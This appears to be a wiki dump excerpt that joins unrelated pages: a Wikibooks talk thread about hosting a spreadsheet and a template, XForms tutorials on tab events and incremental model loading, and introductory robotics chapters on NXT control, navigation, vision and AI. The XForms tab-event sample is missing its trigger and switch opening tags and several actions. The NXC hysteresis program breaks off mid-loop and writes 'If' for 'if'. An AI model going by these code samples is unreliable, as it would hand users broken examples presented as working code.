I could be wrong, but I don't think MS Excel is a supported file type that can be uploaded. ATM I don't think openoffice's ODF is supported either. The file would need to be converted to a supported format, such as a PDF or a screenshot used. Not even plain text files are supported for upload. The best that could be done to preserve it would be to convert it into a wiki-formatted table. To answer the original question though, if the data you used is originally yours then you own the copyright regardless of what program you use to represent the data, so you can release the data under any license you want. To use the data here as wiki-formated table though, you would need to license it under the GFDL. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 14:18, 17 May 2009 (UTC)

:Again with the question on how I could insert an Open Office calculation file in my Wikibook: Clock and data recovery ? Basically the file is the equivalent to a section of proposed exercises. It would help the reader do some circuit simulation by himself, and get confidence in the subject. It is also structured so that it can be a very good introduction for a student to many subjects of modern electronics. It uses filters, operational amplifiers, continuous time and discrete time functions. Even difference equations are used, and they can be demystified and seen in  simple, effective practical use. It is not necessary to actually have the content of the file in the Wikibook, but just to be able and download the file following instructions present in the Wikibook. I have understood that MS is frowned upon, and I agree: in fact the file is now based on an Open Office calculation sheet. The only way to provide the reader with a copy (that is: the only one that I could devise so far) is to mention a dedicated email account (plz.pllsmltor.file@gmail.com) in the Wikibook, and promise to send a copy to anyone mailing to that account. But it looks clumsy, time consuming for me and for the interested reader, and far from practical. I wonder whether you could suggest a workaround to implement an easy access to the file for a reader of the Wikibook. The file is not big, and you can get a copy simply sending an email to plz.pllsmltor.file@gmail.com. Thanks --[[User:BORGATO Pierandrea|BORGATO Pierandrea]] ([[User talk:BORGATO Pierandrea|talk]]) 13:24, 16 August 2009 (UTC)

: I assume you've tried uploading the file to Wikibooks, right? If that doesn't work, I'd suggest using an online file storage service. There are several that allow free hosting of files, but I have no experience of any. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 17:36, 16 August 2009 (UTC)

== Template:Japanese example ==

What browser are you using to review your results of this template? Currently, Firefox and IE have items all over the place. Who knows if I really released it under the correct license, but I took a screenshot of it. [[:File:JapaneseExampleOutput.JPG]] --[[User:Retropunk|Retropunk]] ([[User talk:Retropunk|talk]]) 19:01, 23 August 2009 (UTC)

: I use Opera and Firefox. I don't have access to IE. Your screen-shots are the same as what I get but note that this is still a work in progress. The items aren't all over the place as much as they are in two different places. This template has two different style declarations depending on whether it has the examples passed to it, or is used to style a box (e.g. a table). The former is mostly done, but I've yet to find time to fix the style declarations for the latter.
: Ideally, we'd just be able to create book-wide style-sheets. That is another thing I'm hoping I'll find the time to do. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 19:45, 23 August 2009 (UTC)</text>

      <text xml:space="preserve">== Motivation ==
You want to perform actions based on a tab being selected or deselected.  For example you may want to defer loading large parts of a complex model until a tab is selected.

== Method ==
This example uses event logging to show how the selection and deselection events are used.

== Screen Image ==

[[Image:select-deselect-events.jpg|caption|center|frame|Logging tab selection and deselection events]]

== Sample Code ==
&lt;source lang=&quot;xml&quot;&gt;
&lt;html
   xmlns=&quot;http://www.w3.org/1999/xhtml&quot;
   xmlns:xf=&quot;http://www.w3.org/2002/xforms&quot;
   xmlns:ev=&quot;http://www.w3.org/2001/xml-events&quot;&gt;
   &lt;head&gt;
      &lt;title&gt;Logging Tab Selection and Deselection Events&lt;/title&gt;
      &lt;style type=&quot;text/css&quot;&gt;
            @namespace xf url(&quot;http://www.w3.org/2002/xforms&quot;);
            body {font-family: Helvetica, sans-serif;}
        /* style each individual tab */
        #tab-bar xf|trigger {
        color: black;
        border: 3px outset gray; 
        border-bottom: none;
        font-weight: bold;
        margin-right: 5px;
        padding: 0.2em;
        /* round the top corners - works only with FireFox */
        -moz-border-radius: .5em .5em 0em 0em;
        }
        
        .log {
        background: lavender;
        border: solid blue 1px;
        }
        &lt;/style&gt;
      &lt;xf:model&gt;
         &lt;xf:instance xmlns=&quot;&quot; id=&quot;image&quot;&gt;
            &lt;data /&gt;
         &lt;/xf:instance&gt;
         &lt;xf:instance xmlns=&quot;&quot; id=&quot;log&quot;&gt;
            &lt;events&gt;
               &lt;event&gt;log initialized&lt;/event&gt;
            &lt;/events&gt;
         &lt;/xf:instance&gt;
         &lt;xf:action ev:event=&quot;xforms-ready&quot;&gt;
               &lt;xf:insert nodeset=&quot;instance('log')/event&quot; at=&quot;last()&quot; position=&quot;after&quot; /&gt;
               &lt;xf:setvalue ref=&quot;instance('log')/event[last()]&quot; value=&quot;'xforms-ready event'&quot; /&gt;
         &lt;/xf:action&gt;
      &lt;/xf:model&gt;
   &lt;/head&gt;
   &lt;body&gt;
      &lt;h1&gt;Logging Tab Selection and Deselection Events&lt;/h1&gt;
      &lt;p&gt;The selection and deselection event will generate a message in the event log each time a tab is selected.&lt;/p&gt;
      &lt;div id=&quot;tab-bar&quot;&gt;

            &lt;xf:toggle case=&quot;case-2&quot; ev:event=&quot;DOMActivate&quot; /&gt;
         &lt;/xf:trigger&gt;
         &lt;xf:trigger appearance=&quot;minimal&quot;&gt;

            &lt;xf:toggle case=&quot;case-3&quot; ev:event=&quot;DOMActivate&quot; /&gt;

               &lt;xf:setvalue ref=&quot;instance('log')/event[last()]&quot; value=&quot;'Tab Three selected'&quot; /&gt;
            &lt;/xf:action&gt;
            &lt;xf:action ev:event=&quot;xforms-deselect&quot;&gt;

            &lt;/xf:action&gt;
            &lt;h1&gt;Tab Three&lt;/h1&gt;
         &lt;/xf:case&gt;
      &lt;/xf:switch&gt;
      &lt;xf:repeat nodeset=&quot;instance('log')/event&quot; class=&quot;log&quot;&gt;
         &lt;xf:output ref=&quot;.&quot; /&gt;
      &lt;/xf:repeat&gt;
   &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

== Discussion ==
Note that you must wrap the '''xf:setvalue''' values in a double quote and a single quote to append strings to the events.

      <comment>/* Avoiding Reloads */</comment>
      <text xml:space="preserve">== Motivation ==
You have a large model and you want to incrementally load different portions of the model when they are needed.  This is frequently done when you have a multi-part form and each tab needs additional data.  Loading only the data for the initial tab keeps your form load times fast and avoids unnecessarily locking shared data resources.

== Method ==
We will create a model with three separate instances, one for a list of people, one for a list of places and one for a list of things.  The people will automatically be loaded into the form when the form loads.  We will create triggers that will incrementally load the other portions of the model when they are needed.  Each trigger
will use a submission event that does a separate HTTP get to incrementally load data into a separate instance in the model.

Here is the empty place-holder instance in the model for the places and the submission to get the places data.
&lt;source lang=&quot;xml&quot;&gt;
&lt;xf:instance id=&quot;places&quot;&gt;
    &lt;null/&gt;
&lt;/xf:instance&gt;
&lt;xf:submission id=&quot;get-places&quot; method=&quot;get&quot; action=&quot;places.xml&quot;
    replace=&quot;instance&quot; instance=&quot;places&quot;/&gt;
&lt;/source&gt;

Here is the trigger (button) that gets the new model.
&lt;source lang=&quot;xml&quot;&gt;
&lt;xf:submit submission=&quot;get-places&quot;&gt;
    &lt;xf:label&gt;Load Places&lt;/xf:label&gt;
&lt;/xf:submit&gt;
&lt;/source&gt;

== Screen Image ==
The following are the before and after screen images.  The before screen image is when the form initially loads.  The after image is after the user has pressed the two triggers for loading the places and things.

[[Image:xforms-incremental-model-load-before.jpg|left|frame|Before Model Fully Loaded]][[Image:xforms-incremental-model-load-after.jpg|center|frame|After Model Fully Loaded]]

The above example is designed to be very easy to see how data is loaded when an event is triggered.  In practice each tab in a multi-tab
form may have some data that is only needed if the users click on that tab.  This is a perfect use of dynamic model loading.  The example below illustrates this best-practice.

[[Image:xforms-incremental-tab-loading.jpg|center|frame|Note event log does not reload model data]]

== Load XForms Application ==

Example with triggers that manually load incremental data:
[http://xforms-examples.googlecode.com/svn/trunk/03-dynamic-forms/04-incremental-model-loading/incremental-model-loading.xhtml Load XForms Application]

Example with tab-selection events that incrementally load data
[http://xforms-examples.googlecode.com/svn/trunk/03-dynamic-forms/04-incremental-model-loading/incremental-tab-loading.xhtml Load XForms Application]

Note that in this example the event log shows that the data is only loaded once regardless of how many times the tab is selected.

== Avoiding Reloads ==

The following is an example of how to use conditional actions to check if a instance in the model
already has its data loaded into the form:

&lt;source lang=&quot;xml&quot;&gt;
&lt;xf:case id=&quot;places-case&quot;&gt;
     &lt;xf:action ev:event=&quot;xforms-select&quot; if=&quot;not(instance('places')/place)&quot;&gt;
         &lt;xf:send submission=&quot;get-places&quot;/&gt;
     &lt;/xf:action&gt;
     &lt;h2&gt;Places&lt;/h2&gt;
&lt;/xf:case&gt;
&lt;/source&gt;

The '''if''' attribute of the '''xf:action''' checks to see if there is at least one place in the places instance.  If there is not at least one &quot;place&quot; the submission event is fired.

== Sample Code ==

&lt;source lang=&quot;xml&quot;&gt;
&lt;html
    xmlns=&quot;http://www.w3.org/1999/xhtml&quot;
    xmlns:xf=&quot;http://www.w3.org/2002/xforms&quot;
    xmlns:ev=&quot;http://www.w3.org/2001/xml-events&quot;&gt;
  &lt;head&gt;
    &lt;title&gt;Incremental Model Loading&lt;/title&gt;
    &lt;style type=&quot;text/css&quot;&gt;body {font-family: Helvetica, Arial, sans-serif;&lt;/style&gt;
    &lt;xf:model&gt;
      &lt;!-- unconditionally loaded when the form loads --&gt;
      &lt;xf:instance id=&quot;people&quot; src=&quot;people.xml&quot;&gt;
          &lt;null/&gt;
      &lt;/xf:instance&gt;
      
       &lt;xf:instance id=&quot;places&quot;&gt;
        &lt;null/&gt;
      &lt;/xf:instance&gt;
      &lt;xf:submission id=&quot;get-places&quot; method=&quot;get&quot; action=&quot;places.xml&quot;
        replace=&quot;instance&quot; instance=&quot;places&quot;/&gt;
      
       &lt;xf:instance id=&quot;things&quot;&gt;
        &lt;null/&gt;
      &lt;/xf:instance&gt;
      &lt;xf:submission id=&quot;get-things&quot; method=&quot;get&quot; action=&quot;things.xml&quot;
        instance=&quot;things&quot; replace=&quot;instance&quot;/&gt;
        
    &lt;/xf:model&gt;
  &lt;/head&gt;

  &lt;body&gt;        
    &lt;h1&gt;Incremental Model Loading&lt;/h1&gt;
    &lt;p&gt;Not all parts of the model need to be loaded into a form when it is first loaded.  For
    large models, different sections can be loaded as they are needed.&lt;/p&gt;

    &lt;h2&gt;People&lt;/h2&gt;
      &lt;xf:group ref=&quot;instance('people')&quot;&gt;
         &lt;xf:repeat nodeset=&quot;person&quot;&gt;
           &lt;xf:output ref=&quot;name&quot;/&gt;&lt;br/&gt;
        &lt;/xf:repeat&gt;
      &lt;/xf:group&gt;
      
      &lt;h2&gt;Places&lt;/h2&gt;
      &lt;xf:group ref=&quot;instance('places')&quot;&gt;
         &lt;xf:repeat nodeset=&quot;place&quot;&gt;
            &lt;xf:output ref=&quot;name&quot;/&gt;&lt;br/&gt;
        &lt;/xf:repeat&gt;
        &lt;xf:submit submission=&quot;get-places&quot;&gt;
            &lt;xf:label&gt;Load Places&lt;/xf:label&gt;
          &lt;/xf:submit&gt;
      &lt;/xf:group&gt;
      
      &lt;h2&gt;Things&lt;/h2&gt;
      &lt;xf:group ref=&quot;instance('things')&quot;&gt;
         &lt;xf:repeat nodeset=&quot;item&quot;&gt;
            &lt;xf:output ref=&quot;name&quot;/&gt;&lt;br/&gt;
         &lt;/xf:repeat&gt;
         &lt;xf:submit submission=&quot;get-things&quot;&gt;
            &lt;xf:label&gt;Load Things&lt;/xf:label&gt;
          &lt;/xf:submit&gt;
     &lt;/xf:group&gt;

  &lt;/body&gt;
&lt;/html&gt; 

&lt;/source&gt;

== The Future of Robots ==
The great success of robots so far has been in automating repetitive tasks in process control and assembly, yielding dramatic cuts in production, but the next step towards cognition and more human-like behaviour has proved elusive. It has been difficult to make robots that can truly learn and adapt to unexpected situations in the way humans can, while it has been equally challenging trying to develop a machine capable of moving smoothly like any animal. There is still no robot capable of walking properly without jerky slightly unbalanced movements. Today's robot designers will have to solve some fundamental problems before robots can become as versatile, independent and useful as the ones we've seen for years in the movies.

The future of robotics is split between four main categories:

===Telepresence===
This kind of robot allows people to hold remote controlled videoconferences from far distances, rather than traveling great distances in order to have face to face meeting. On the other hand, telepresence is another way of letting the users perceive no difference from the actual presence. This ability to be able to manipulate a remote object or environment is an important aspect of real telepresence systems. In remote controlled telepresence the movements of the user's hands are sensed by wired gloves and inertial sensors, and then a robot in a remote location copies those movements.

The ability to see and manipulate objects in remote locations, particularly hostile ones (&quot;dull, dirty and dangerous jobs&quot;), remains a key application for mobile robots. In the military, this translates into a multitude of applications. For example, iRobot's PackBots are deployed in Iraq and Afghanistan to scope out who is in a building, ahead of soldiers entering it. Healthcare is also taking advantage of telepresence applications, such as InTouch Health's mobile videoconferencing robots, which let physicians interact remotely with patients in the hospital.

===Rescue and lifting ===
This kind of robot capability is mostly used in warfare. They are used on the battlefield to help soldiers clear out buildings, and can also sense if there is danger inside buildings before they enter.

The U.S. Army is developing robots that can retrieve and carry a wounded solder from a battle site, a very risky task for human soldiers. Vecna Technologies' Battlefield Extraction-Assist Robot (BEAR) is a prototype robot that can detect people through the use of infrared, pick them up and carry them to safety. The technology could also be used for healthcare and home care applications in the longer term.

===Navigation===
Navigation could allow the robots to be able to create their own routes to deliver items or scan for assets. On the other hand, a robot programmed for navigation purposes, for example, might guide people through a museum.

Aethon's Tug robots offer a sophisticated navigation capability that lets them download a map of a building (such as a hospital) and use dead reckoning to find their way from one location to another. They can sense objects and obstructions and create a new route on the fly if necessary. Tugs are being used in a number of hospitals to deliver drugs, meals or other supplies.

===Humanoid robots ===
These kinds of robots are autonomous, because they change to their environment while reaching their goal. A fully functioning autonomous robot has the ability to do the following tasks:
* Gain information about the environment.
* Work without the help of human in extended period of time.
* Able to mobilize all its parts without human’s assistance in its environment.
* Capable of avoiding situations that are harmful to people, property.

Since humanoid robots try to simulate the human structure and behavior they are most of the time more complex than any other kind of robots. Humanoid robots are created to imitate some of the physical and mental tasks that humans undergo daily. Scientists from different fields combine efforts so that one day humanoid robots will be able to understand human intelligence reason and act like humans themselves.

There is very little U.S. activity in humanoid robots, or androids, a field which is dominated by Japan and Korea (such as Honda's Asimo and Kokoro's Actroid). However, one U.S. company, Hanson Robotics, is pioneering lifelike heads with realistic-looking skin and features. The heads can talk when someone approaches and maintain eye contact during the conversation.

== Programming Concepts ==
The programming concept for robots is to describe the desired robot behavior and must be supported by a programming system. These programming systems can be distinguished by both their aim and by their method of programming. Programming system is typically undertaken by developers before the low or medium level tasks. Level tasks programming is the allocation of tasks by consumers.
Robot programming concepts is a sophisticated human-robot interactions techniques programming. The robot must model and reason about the human programmer's intentions and be able to recognize plans presented by human.

Robots systems have special programming demands related to their complex interactions in real environment, their complex sensors, and actuators. These programming demands provide appropriate human-robot programming interactions such as programming languages, tools, and distributed infrastructures. Robot programming systems have three important conceptual components that include:

# The programming component that includes designs for programming languages, libraries and application programming interfaces (APIs), which enable a programmer to describe desired robot behavior.
# The underlying infrastructure includes the designs for architectures that support and execute robot behavior descriptions, especially in distributed environments.
# The design of interactive systems that allow the human programmer to interact with the programming component, to create, modify and examine programs and system resources, both statically and during execution. 

The programming system consists of the two main programming methods which are the manual programming and automatic programming.

Manual programming: involves text based or graphical system, which is common in industry where languages are used in simple robots. Text based systems have diverged from robot specific languages to develop more higher level programming such as C++, Java, Haskell, Robot C.

Automatic programming: includes the programming by demonstration (PBD), which is currently popular for training specific tasks, particularly in industry. Of the two main programming methods, considerable effort is aimed at improving the PBD system. For example, in automatic programming a robot may pick out important movements and plan on its own path between points, or execute the key steps in different order.


== Robot Hardware example ==
The NXT Lego Mindstorms kit consists of the following robot hardware:

*NXT Intelligent Brick
*Ultrasonic distance and movement sensor
*Sound sensor, with sound pattern
*Light sensor, detecting light intensity
*Touch sensor (press/release/bump detection)
*Three interactive servo motors
*Three output ports, six-wire digital platform
*Four input ports, six-wire digital platform
*Loudspeaker, 8 kHz sound quality
*Power source: six AA batteries
*User Guide
*Easy to use software
*577 LEGO Technic parts
== Robot Control ==
The main component in robot control is the brick shaped computer called the NXT Intelligent Brick. It is the state-of the art programmable intelligent brick that acts as the brain for robots. The NXT Intelligent Brick can take input from up to four sensors and control up to three motors. The brick has a 100 × 64 pixel monochrome LCD display and four buttons that can be used to navigate a user interface using hierarchical menus. The speaker is also on the brick that can play sound files at sampling rates up to 8 kHz. Power is supplied by 6 AA (1.5 V each) batteries and by a Li-ion rechargeable battery and with a charger.
In addition to the NXT intelligent Brick, robot control has the following capabilities:

*Motors: the motors are the primary source of power. The robot will use the motors to move around, lift loads, operate arms, grab objects, pump air, and perform any other task that requires power. There are also different kinds of electric motors that share the property of converting electrical energy into mechanical energy.
*Touch Sensors: the touch sensors work more or less like the push button portion of the doorbell, when pressed a circuit it completed and electricity flows through it.
*Light Sensors: the light sensors detect light and measure its intensity. In spite of its limitations you can use it for a broad range of applications.

Probably the biggest problem facing a robot control is the overall system reliability. A robot might face any combination of the following failure modes: 
*Mechanical failures: these might range from a temporarily jammed movement to wedged gear trains or a serious mechanical breakdown.
*Electrical failures: this is when a computer itself will not fail but loose connections of motors and sensors which are a common problem.
*Sensor unreliability: sensors will provide noisy data (data that is sometimes accurate, sometimes not) or data that is simply incorrect (touch sensor fails to be triggered).

The task of robot control can be solved by introducing three different robot behaviors:
*Pushing an object
*Avoiding the black line&gt;
*Wandering around

The robot has no way of checking that the area is free of objects that must be removed and new objects may be dropped in the area; this means that it may look as if the robot is patrolling, searching eagerly for unwanted objects to throw out.

The behaviors should be implemented by a kind of servo-mechanism, which we can consider as a principle of performing a selected behavior only in a very short time interval before the sensors are checked again.

You will need to first describe these behaviors in more detail and for each specify under which conditions of trigger readings they are relevant to perform. Specify also an order of importance in which the different behaviors should be activated, when more than one is possible.

== Mathematics of Robot Control ==
Mathematics of robot control is a powerful tool for system design and control especially models of system's dynamics. This applies to any system but more specifically on human and humanoid robots. The dynamic control is generally a desirable solution if the dynamics can be calculated so the dynamic effects are important for a particular control problem. Computation time reduces rapidly with new computers, some dynamic problems (like link flexibility) are still considered time consuming. 

Robotics was started from mathematical modeling of robot kinematics and dynamic. Two leg walking was considered with the aim of generating a stable gait, and the arm and hand were modeled in order to allow manipulation. For example, rehabilitation devices appeared to suitable where prostheses were made for leg, arm and hand, and also prostheses for arm and legs, thus resulting in an active exoskeleton. Some of these multilegged robots were designed while trying to solve the transport on rough terrain. 
Regarding the mathematical description full kinematic and dynamics were involved from the very beginning of robotics. In this mathematical modeling of a walking robot, Newton's and Euler's equations were used to describe the mathematical of robot control. 

Some other mathematics tools are also used, for example for sensors data acquisition, there are three sequential math sections in robot programming:
*Averages
*Interpolation
*Hysteresis

'''Averages''' are a useful instrument to soften the differences between single readings and to ignore temporary peaks. They allow you to group a set of readings and consider it as a single value. When you are dealing with a flow of data coming from a sensor, the moving average is the right tool to process the last n readings.

This is how to use a moving average for three values in a program:

&lt;source lang=&quot;c&quot;&gt;
int avg, v1, v2, v3;
v2 = Sensor_1;
v3 = Sensor_1;

while(true)
{
  v1 = v2;
  v2 = v3;
  v3 = Sensor_1;
  avg = (v1+v2+v3) / 3;
}&lt;/source&gt;

'''Interpolation''' is a class of mathematical tools designed to estimate values from known data. The interpolation technique proves useful when you want to estimate the value of a quantity that falls between two known limits. Linear interpolation draws a straight line across two points in a graph. You then can use that line to calculate any value in the interval.

'''Hysteresis''' will help you in reducing the number of corrections your robot has to make to keep within a required behavior. By adding some hysteresis to your algorithms, your robot will be less reactive to changes. Hysteresis can also increase the efficiency of your system.

This sample program demonstrates hysteresis. The program plays tones to ask you to turn left or right.

&lt;source lang=&quot;c&quot;&gt;
#define GRAY 50
#define H 3

task main()
{
  SetSensor(Sensor_1, Sensor_Light);
  while(true)
  {
    If (Sensor_1&gt;GRAY+H)
    PlayTone(440,20);

== Robot Programming Languages ==
The development of modern robot programming languages started in the mid '70s. Some examples of programming languages in the mid '70s are VAL (predecessor of Adept's V+) and AML. These programming languages represent some of the early robot programming languages which had sophisticated data structures. 

There is no single robot programming language available, allowing flexible specifications of functional interdependences of path properties. The choice on which language to choose depends on following few points:

*Having previous experiences and making sure that you are comfortable with the kind of programming language to use.
*The time and effort you plan to work on the program, because not every programming language is equally hard or easy to work with.

Text based programming is common in industry where simple robot languages are used, they are typically provided by the robot developer. With the development of technology nowadays, text based system has diverged from these robot languages to develop more general purposed in higher level programming languages that are suitable for any robot. Typically this involves extending existing languages such as C++, Java, Haskell.

The LEGO MINDSTORMS NXT kit comes with programmable languages called NXC. The NXC stands for Not eXactly C, this is a simple programming language for the Lego Mindstorms. The NXT has a bytecode interpreter which is provided by LEGO that can be used to execute programs. The NXC compiler translates a source program into NXT btyecodes, which can then be executed on the target itself.

The NXC is not a general purpose programming language there are many restrictions that stem from limitations of the NXT bytecode interpreter. The NXC Application Programming Interface (API) describes the system functions, constants, and macros that can be used by programs. All Application Programming Interface are defined in a special file known as the &quot;header file&quot; which is automatically included when compiling a program. Both the NXC languages and the API provide information needed to write the NXC programs.

NXC is also a case-sensitive language just like C and C++, which means that the identifier for example &quot;xYz&quot; is not the same identifier as &quot;Xyz&quot;. Similarly the &quot;if&quot; statement begins with the keyword &quot;if&quot; but &quot;IF&quot;, &quot;If&quot;, or &quot;IF&quot; are all just identifiers. NXC also uses lexical rules to describe how sources file break into individual tokens. This basically includes the way comments are written and valid characters for identifiers. 

There are also many other programming languages available.

== Obstacle Avoidance == 
Obstacle avoidance is one of the most important aspects of the robotics world. Without having a way to avoid obstacles, robots would be very limited in what they could do, especially those that rely on a program that requires them to navigate around or to a specific location. For instance, if a robot was programmed to move from point A to point B and had no way of detecting obstacles so that it can avoid it, that robot would not be able to get to its location if the path to the designated location was not a straight line with no obstacles in its way. The robot will eventually run into an obstacle and will continue to try to move against it because it could not detect the obstacle in its path. 

With a way to avoid obstacles, robots would have a better navigations system and be able to traverse obstacles with ease. Detectors such as touch or light sensors help robots to detect obstacles. Through the use of programs, the robot can be directed to move in a number of ways around the obstacle to avoid it once it is detected. The robot could be programmed to reverse and then turn to find a different path or simply turn left or right as soon as the obstacle is detected. Using the light sensor, the robot can detect lines on the floor that it can either avoid or can be programmed to follow. The line can be laid out in a path and once the robot picks up the dark line, it can be programmed to follow it without leaving its path. 

== Task Planning and Navigation ==
Task planning and navigation refers to the programming of the robot and how it goes about performing its assigned tasks and how it is able to navigate itself around its environment and be able to avoid obstacles to avoid collisions to be able to continue to function properly. The navigations system of the robot is very important. If a robot is not able to move around in its environment with ease and avoid obstacles then it will not be able to complete its task properly. 

Task planning is also important as it lays out the order in which a robot will complete its tasks. A robot can be programmed to complete several tasks, but if the tasks aren’t completed in a certain order, the end result may not be desirable. Task planning can range from plotting out tasks in a routine order or branch off into different decision making paths. For instance if a robot is programmed to go straight until it either hits an obstacle or detects a dark line on its path, it can be programmed to do many tasks depending on the programmer. Not only does task planning have to do with decision making for the robot, but it also controls loops that the robot will perform upon meeting specific requirements. Task planning is important because it keeps the robot in check to make sure that it performs all of its tasks as desired. A robot that isn't able to plan out its tasks properly would just go about performing random tasks as it sees fit and may be completely undesirable to the way the programmer wants the robot to perform.

A robot navigates around its environment using sensors to detect whether it is too close to an object to avoid a collision. This is only one type of sensor that a robot may use to avoid collisions. Other sensors include light sensors that a robot may use to follow a specified path drawn out on the floor. For instance, the robots light sensor can be programmed to pick up the dark colors. Once the sensor picks up a dark color, which can be a black line on the floor, the robot will navigate itself to follow that line. This can be used to program the robot to follow a specific laid out path. Touch sensors can be used to help a robot avoid collisions with obstacles and walls. The robot can be programmed to move around in its environment freely, once it bumps or runs into an obstacle, the touch sensor will activate and depending on how the robot is programmed, it will back up and plot out a new path until it runs into another obstacle. 

Navigation can be defined as the combination of the three fundamental competences:

*Self-Localisation
*Path Planning
*Map-Building and Map-Interpretation

'''Self-Localisation''' is the ability of an autonomous robot to estimate its position while moving about its environment. Self-Localisation implies measurement with respect to a certain coordinate frame: this can be either pre-determined by some external input or defined by the robot automatically. The coordinate frame itself, though, is not of fundamental importance: what matters is how the robot can estimate the relative positions of features of interest in the world (landmarks, obstacles, targets, etc.) and its own position with respect to them.

'''Path Planning''' is used to determine a route from one coordinate location to another along a set of waypoints. For example, if you had an image of a maze and you needed to determine the best path from where the robot is currently located to where it needs to be you would use Path Planning to determine the shortest or best path to the desired location.

'''Map-Building''' is when a robot generates a map of the environment using sensor information, while localizing itself relative to the map. This is especially challenging because for localization the robot needs to know where the features are, whereas for map-building the robot needs to know where it is on the map. In addition, there are inherent uncertainties in discerning the robot's relative movement from its various sensors.

== Robot Vision ==
Vision systems are generally used in manufacturing companies to perform simple tasks such as counting objects that pass by on a conveyor belt, reading serial numbers or searching for surface defects. These tasks are simple programs that work through the use of a camera installed on the robot and are detected after the object is scanned. A robot does not process images the same way a human does. While humans can rely on inference systems and assumptions, computing devices must see by examining individual pixels of images, processing them and attempting to develop conclusions with the assistance of knowledge bases and features such as pattern recognition engines. Machine vision and computer vision systems are capable of processing images consistently, but computer-based image processing systems are typically designed to perform single, repetitive tasks.

Processing methods:
* Pixel counting: counts the number of light or dark pixels 
* Thresholding: converts an image with gray tones to simply black and white 
* Segmentation: used to locate and/or count parts 
* Blob discovery &amp; manipulation: inspecting an image for discrete blobs of connected pixels (e.g. a black hole in a grey object) as image landmarks. These blobs frequently represent optical targets for machining, robotic capture, or manufacturing failure.
* Recognition-by-components: extracting geons from visual input
* Robust pattern recognition: location of an object that may be rotated, partially hidden by another object, or varying in size
* Barcode reading: decoding of 1D and 2D codes designed to be read or scanned by machines 
* Optical character recognition: automated reading of text such as serial numbers 
* Gauging: measurement of object dimensions in inches or millimeters 
* Edge detection: finding object edges 
* Template matching: finding, matching, and/or counting specific patterns

Some of the things that a robot's vision system may consist of are:
*One or more digital or analog camera (black-and-white or color) with suitable optics for acquiring images
*Camera interface for digitizing images (widely known as a &quot;frame grabber&quot;)
*A processor (often a PC or embedded processor, such as a DSP)
*Input/Output hardware (e.g. digital I/O) or communication links (e.g. network connection or RS-232) to report results 
*Lenses to focus the desired field of view onto the image sensor.
*Suitable, often very specialized, light sources (LED illuminators, fluorescent or halogen lamps etc.)
*A program to process images and detect relevant features.
*A synchronizing sensor for part detection (often an optical or magnetic sensor) to trigger image acquisition and processing.
*Some form of actuators used to sort or reject defective parts.

The applications of machine vision (MV) are diverse, covering areas including, but not limited to:
*Large-scale industrial manufacture
*Short-run unique object manufacture
*Safety systems in industrial environments
*Inspection of pre-manufactured objects (e.g. quality control, failure investigation)
*Visual stock control and management systems (counting, barcode reading, store interfaces for digital systems)
*Control of automated guided vehicles (AGVs)
*Quality control and refinement of food products
*Retail automation

== Knowledge Based Vision Systems ==
Vision systems are generally used in manufacturing companies to perform simple tasks such as counting objects that pass by on a conveyor belt, reading serial numbers or searching for surface defects. These tasks are simple programs that work through the use of a camera installed on the robot and are detected after the object is scanned. A robot does not process images the same way a human does. While humans can rely on inference systems and assumptions, computing devices must see by examining individual pixels of images, processing them and attempting to develop conclusions with the assistance of knowledge bases and features such as pattern recognition engines. Machine vision and computer vision systems are capable of processing images consistently, but computer-based image processing systems are typically designed to perform single, repetitive tasks. A knowledge based vision system would allow a robot to make inferences and assumptions. The robot would be able to identify an object and then be able to determine if that object were to be dangerous or not. The robot would first be given a list of objects to identify. Using its knowledge system, the robot would use the web to find images of the items it was given to find. Once it finds and identifies all of the objects, the robot will start on its search for the objects. Not only are the vision sensors an essential part in this process but the motion controls must also be functioning. The robot must be able to move and traverse through obstacles to be able to find its objects.

A knowledge-based vision system in turn links to the artificial intelligence of a robot. To be able to create a fully functional android, the robot must have a working artificial intelligence and a working knowledge based visions system. Not only will the android be able to think on its own, it will be able to view the world as a human does. Whatever the robot sees, it will be able to make its own assumptions and own perceptions of its surrounding and the objects that it identifies. 

There is a challenge called The Semantic Robot Vision Challenge (abbreviated SRVC) that best describes what knowledge based vision systems are.  SRVC is a research competition that is designed to push the state of the art in image understanding and automatic acquisition of knowledge from large unstructured databases of images (such as those generally found on the web). In this competition, fully autonomous robots receive a text list of objects that they are to find. They use the web to automatically find image examples of those objects in order to learn visual models. These visual models are then used to identify the objects in the robot's cameras.

In general terms:
*The vision sensor must be able to send coordinates to the motion controller.
*The motion controller must be able to accept commands.
*The vision pixel coordinates must be converted to real world coordinates by vision sensor, additional PC, or motion controller.
*Send data.
*Make move.

== Robots and Artificial Intelligence ==
Artificial Intelligence is the area of computer science focusing on creating machines that can engage on behaviors that humans consider intelligent. The ability to create intelligent machines has intrigued humans since ancient times, and today with the advent of the computer and 50 years of research into AI programming techniques, the dream of smart machines is becoming a reality.

Artificial Intelligence can be described as the mind of a robot. It is their ability to learn, reason, solve problems, perceive, and how understand everything around them. You can build a robot and program it to do certain tasks but it will not be intelligent. That robot will perform only those tasks in which it was programmed to do in a continuous loop. If you programmed the robot to pick up a box in a specific location and move it to another destination and you were to move the box at the starting destination not too far away from where it is supposed to be, the robot will not be able to process in its mind that the box has moved. It will register that the box is not there so it will halt what it was programmed to do until the box is back where it is supposed to be. That robot may be able to move and do what it is programmed to do but without an artificial intelligence, it will not be able to learn or perceive the changes in the environment around it. One of the main challenges today is implementing an advanced artificial intelligence into a robot. Although robots may only be able to perform tasks that they are programmed to do, one day, the creation of an artificial intelligence will allows robots to learn and think just as humans do. Not only will these robots be able to perform tasks that they have been programmed to do, they will be able to adapt to their environments and situations, learn, reason, solve problems, and even be able to process and understand language. Robots will one day be able to think and act like humans and even be able to interact and communicate with us as well. 

When most people think of artificial intelligence and its use in robots, the most common image that will pop up is the image of a humanoid robot. This image of the robot is of one that can talk and think like a human being and is capable of making its own decisions. Although this is one way that artificial intelligence can be implemented in robots, it is not the only way. Artificial intelligence can be used for more than just androids. If implemented into a machine that has the task of monitoring something, that machine will be able to perform its task more efficiently and will be able to do more than just simple tasks. 

Advantages:
#Provide answers for decisions, processes and tasks that are repetitive
#Hold huge amounts of information
#Minimize employee training costs
